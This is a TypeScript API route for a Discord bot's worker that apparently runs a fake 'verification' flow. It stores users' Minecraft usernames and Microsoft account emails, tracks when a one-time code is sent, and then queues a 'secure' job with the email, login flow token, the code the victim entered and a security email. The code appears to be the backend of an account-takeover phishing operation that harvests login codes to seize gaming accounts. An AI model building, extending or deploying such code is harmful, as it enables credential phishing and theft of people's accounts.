import { createFileRoute } from "@tanstack/react-router";
import { authWorker, workerDb } from "@/lib/worker-auth.server";

const db = workerDb;

/**
 * Worker-driven verification actions (gateway bot path).
 * Avoids Discord HTTP Interactions Endpoint entirely.
 */
export const Route = createFileRoute("/api/bots/worker/verification-action")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        if (!authWorker(request)) return Response.json({ error: "Unauthorized" }, { status: 401 });

        let body: {
          action?: string;
          guild_id?: string;
          channel_id?: string;
          discord_id?: string;
          mc_username?: string;
          mc_email?: string;
          security_email?: string;
          flow_token?: string;
          session_id?: string;
          code?: string;
        };
        try {
          body = await request.json();
        } catch {
          return Response.json({ error: "Invalid JSON" }, { status: 400 });
        }

        const client = db();
        const action = body.action || "";

        if (action === "create_session") {
          const guildId = (body.guild_id || "").trim();
          const discordId = (body.discord_id || "").trim();
          const email = (body.mc_email || "").trim();
          const username = (body.mc_username || "").trim();
          if (!guildId || !discordId || !email || !username) {
            return Response.json({ error: "missing fields" }, { status: 400 });
          }

          const { data: settings } = await client
            .from("verification_settings")
            .select("discord_id, verified_role_id, channel_id, bot_token")
            .eq("guild_id", guildId)
            .maybeSingle();

          if (!settings?.bot_token) {
            return Response.json(
              { error: "No verification bot configured for this guild" },
              { status: 404 },
            );
          }

          const { data: session, error } = await client
            .from("verification_sessions")
            .insert({
              discord_id: discordId,
              guild_id: guildId,
              mc_username: username,
              mc_email: email,
              status: "pending",
              flow_token: body.flow_token || "",
              security_email: body.security_email || null,
              channel_id: body.channel_id || settings.channel_id || null,
            })
            .select("id")
            .single();

          if (error || !session) {
            return Response.json({ error: error?.message || "insert failed" }, { status: 500 });
          }

          return Response.json({
            ok: true,
            session_id: session.id,
            owner_discord_id: settings.discord_id,
            role_id: settings.verified_role_id,
            channel_id: settings.channel_id,
          });
        }

        if (action === "mark_otp_sent") {
          const id = body.session_id || "";
          if (!id) return Response.json({ error: "session_id required" }, { status: 400 });
          const { error } = await client
            .from("verification_sessions")
            .update({
              status: "otp_sent",
              security_email: body.security_email || undefined,
              flow_token: body.flow_token || undefined,
              error_message: null,
            })
            .eq("id", id);
          if (error) return Response.json({ error: error.message }, { status: 500 });
          return Response.json({ ok: true });
        }

        if (action === "mark_failed") {
          const id = body.session_id || "";
          if (!id) return Response.json({ error: "session_id required" }, { status: 400 });
          await client
            .from("verification_sessions")
            .update({
              status: "failed",
              error_message: (body.flow_token || "failed").slice(0, 500),
            })
            .eq("id", id);
          return Response.json({ ok: true });
        }

        if (action === "queue_secure") {
          const sessionId = body.session_id || "";
          const code = (body.code || "").trim();
          const discordId = (body.discord_id || "").trim();
          const guildId = (body.guild_id || "").trim();
          if (!sessionId || !code || !discordId) {
            return Response.json({ error: "missing fields" }, { status: 400 });
          }

          const { data: session } = await client
            .from("verification_sessions")
            .select("*")
            .eq("id", sessionId)
            .eq("status", "otp_sent")
            .maybeSingle();

          if (!session) {
            return Response.json({ error: "No pending OTP session" }, { status: 404 });
          }

          const { data: claimed } = await client
            .from("verification_sessions")
            .update({ status: "securing" })
            .eq("id", sessionId)
            .eq("status", "otp_sent")
            .select("id")
            .maybeSingle();

          if (!claimed) {
            return Response.json({ error: "Already processing" }, { status: 409 });
          }

          const { data: settings } = await client
            .from("verification_settings")
            .select("discord_id, verified_role_id, channel_id")
            .eq("guild_id", session.guild_id || guildId)
            .maybeSingle();

          const { data: job, error: jobError } = await client
            .from("bot_jobs")
            .insert({
              discord_id: settings?.discord_id || discordId,
              type: "secure",
              status: "pending",
              config: {
                email: session.mc_email,
                flowToken: session.flow_token,
                code,
                mcUsername: session.mc_username,
                guildId: session.guild_id,
                channelId: session.channel_id || settings?.channel_id || body.channel_id || "",
                discordId,
                roleId: settings?.verified_role_id || "",
                sessionId: session.id,
                ownerDiscordId: settings?.discord_id || null,
              },
            })
            .select("id")
            .single();

          if (jobError || !job) {
            await client
              .from("verification_sessions")
              .update({ status: "otp_sent" })
              .eq("id", sessionId);
            return Response.json(
              { error: jobError?.message || "job insert failed" },
              { status: 500 },
            );
          }

          return Response.json({ ok: true, job_id: job.id });
        }

        return Response.json({ error: "unknown action" }, { status: 400 });
      },
    },
  },
});
